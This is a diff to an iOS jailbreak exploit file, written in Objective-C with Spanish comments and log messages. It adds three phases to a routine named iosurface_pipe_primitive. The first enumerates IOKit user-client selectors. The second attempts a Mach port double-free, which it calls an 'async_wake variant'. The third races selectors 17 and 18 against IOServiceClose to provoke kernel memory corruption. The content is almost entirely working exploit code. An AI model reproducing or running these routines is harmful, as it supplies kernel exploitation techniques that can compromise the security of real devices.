@@ -27112,6 +27112,125 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             }
         }
 
+        // === FASE 10: Enumeración de selectores 0-30 ===
+        log(@"[JB22] ═══ Fase 10: Enumeración selectores 0-30 ═══");
+        if (!isr_stopped()) {
+            io_connect_t cEnum = 0;
+            if (sym.open(svc, mach_task_self(), 0, &cEnum) == KERN_SUCCESS) {
+                int interestingSels = 0;
+                for (int sel = 0; sel <= 30 && !isr_stopped(); sel++) {
+                    if (sel == 17 || sel == 18) continue;
+                    uint64_t inBuf[4] = {1, 2, 3, 4};
+                    uint64_t outScalar[4] = {0};
+                    uint32_t outCnt = 4;
+                    kern_return_t kr = sym.call(cEnum, sel, NULL, 0, inBuf, 32,
+                                                outScalar, &outCnt, NULL, NULL);
+                    if (kr != (kern_return_t)0xe00002c2) {
+                        interestingSels++;
+                        log([NSString stringWithFormat:@"[JB22] sel%d(struct) → 0x%x outCnt=%u out=[0x%llx,0x%llx,0x%llx,0x%llx]",
+                             sel, kr, outCnt, outScalar[0], outScalar[1], outScalar[2], outScalar[3]]);
+                    }
+                    uint64_t scalarIn[4] = {1, 2, 3, 4};
+                    outScalar[0] = outScalar[1] = outScalar[2] = outScalar[3] = 0;
+                    outCnt = 4;
+                    kern_return_t kr2 = sym.call(cEnum, sel, scalarIn, 4, NULL, 0,
+                                                 outScalar, &outCnt, NULL, NULL);
+                    if (kr2 != (kern_return_t)0xe00002c2 && kr2 != kr) {
+                        log([NSString stringWithFormat:@"[JB22] sel%d(scalar) → 0x%x outCnt=%u out=[0x%llx,0x%llx]",
+                             sel, kr2, outCnt, outScalar[0], outScalar[1]]);
+                    }
+                    kern_return_t kr3 = jb20_call_sel(cEnum, sel, in3, 24, calibShape, asyncCall, sym.call);
+                    if (kr3 == KERN_SUCCESS) {
+                        interestingSels++;
+                        log([NSString stringWithFormat:@"[JB22] ★ sel%d(async shape=%d) → SUCCESS", sel, calibShape]);
+                    } else if (kr3 != (kern_return_t)0xe00002c2 && kr3 != kr) {
+                        log([NSString stringWithFormat:@"[JB22] sel%d(async) → 0x%x", sel, kr3]);
+                    }
+                }
+                log([NSString stringWithFormat:@"[JB22] Selectores interesantes: %d", interestingSels]);
+                sym.close(cEnum);
+            }
+        }
+
+        // === FASE 11: Mach port double-register en sel17 (async_wake variant) ===
+        log(@"[JB22] ═══ Fase 11: Mach port double-register ═══");
+        if (!isr_stopped()) {
+            for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
+                mach_port_t victimPort = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &victimPort);
+                mach_port_insert_right(mach_task_self(), victimPort, victimPort, MACH_MSG_TYPE_MAKE_SEND);
+                io_connect_t cPort = 0;
+                if (sym.open(svc, mach_task_self(), 0, &cPort) != KERN_SUCCESS) {
+                    mach_port_destroy(mach_task_self(), victimPort);
+                    continue;
+                }
+                uint64_t buf17[3] = {1, 2, 3};
+                uint64_t ref1 = 0x1122334455667788ull;
+                uint32_t soc1 = 0;
+                kern_return_t r1 = asyncCall(cPort, 17, victimPort, &ref1, 1,
+                                             NULL, 0, buf17, 24, NULL, &soc1, NULL, NULL);
+                uint64_t buf17b[3] = {1, 2, 3};
+                uint64_t ref2 = 0xAABBCCDDEEFF0011ull;
+                uint32_t soc2 = 0;
+                kern_return_t r2 = asyncCall(cPort, 17, victimPort, &ref2, 1,
+                                             NULL, 0, buf17b, 24, NULL, &soc2, NULL, NULL);
+                mach_port_type_t ptype = 0;
+                mach_port_type(mach_task_self(), victimPort, &ptype);
+                kern_return_t dk = mach_port_deallocate(mach_task_self(), victimPort);
+                mach_port_type_t ptype2 = 0;
+                kern_return_t tk2 = mach_port_type(mach_task_self(), victimPort, &ptype2);
+                log([NSString stringWithFormat:@"[JB22] Trial%d: r1=0x%x r2=0x%x pre=0x%x dk=0x%x post=0x%x/0x%x %s",
+                     trial, r1, r2, ptype, dk, tk2, ptype2,
+                     (tk2 != KERN_SUCCESS) ? "★ PORT FREED" : "alive"]);
+                if (tk2 != KERN_SUCCESS) {
+                    heapPtrsFound++;
+                    log(@"[JB22] ★★★ MACH PORT DOUBLE-FREE — async_wake variant FUNCIONA!");
+                }
+                sym.close(cPort);
+                if (tk2 == KERN_SUCCESS) {
+                    mach_port_destroy(mach_task_self(), victimPort);
+                }
+            }
+        }
+
+        // === FASE 12: Race condition sel17/sel18 vs IOServiceClose ===
+        log(@"[JB22] ═══ Fase 12: Race condition (200 intentos) ═══");
+        if (!isr_stopped()) {
+            typedef kern_return_t (*RawCloseFn)(io_connect_t);
+            RawCloseFn rawClose = (RawCloseFn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+            int raceAnomalies = 0;
+            for (int attempt = 0; attempt < 200 && !isr_stopped(); attempt++) {
+                io_connect_t cRace = 0;
+                if (sym.open(svc, mach_task_self(), 0, &cRace) != KERN_SUCCESS) continue;
+                jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
+                __block volatile int closed = 0;
+                io_connect_t cCopy = cRace;
+                RawCloseFn closeCopy = rawClose;
+                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                    usleep(arc4random_uniform(30));
+                    closeCopy(cCopy);
+                    closed = 1;
+                });
+                ISR_CallFn callCopy = sym.call;
+                ISR_AsyncCallFn asyncCopy = asyncCall;
+                for (int i = 0; i < 30 && !closed; i++) {
+                    uint64_t db[3] = {1, 2, 3};
+                    kern_return_t kr18 = callCopy(cRace, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
+                    kern_return_t kr17 = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCopy, callCopy);
+                    if (kr18 != KERN_SUCCESS && kr18 != (kern_return_t)0xe00002c2
+                        && kr18 != (kern_return_t)0xe00002ed && kr18 != (kern_return_t)0xe00002be) {
+                        raceAnomalies++;
+                        if (raceAnomalies <= 20)
+                            log([NSString stringWithFormat:@"[JB22] ★★ RACE[%d.%d] sel18=0x%x sel17=0x%x",
+                                 attempt, i, kr18, kr17]);
+                    }
+                }
+                while (!closed) usleep(100);
+            }
+            log([NSString stringWithFormat:@"[JB22] Race anomalías: %d/200", raceAnomalies]);
+            if (raceAnomalies > 0) heapPtrsFound += raceAnomalies;
+        }
+
         if (sentinels) {
             for (int i = 0; i < sentinelCount; i++) {
                 if (sentinels[i]) CFRelease(sentinels[i]);
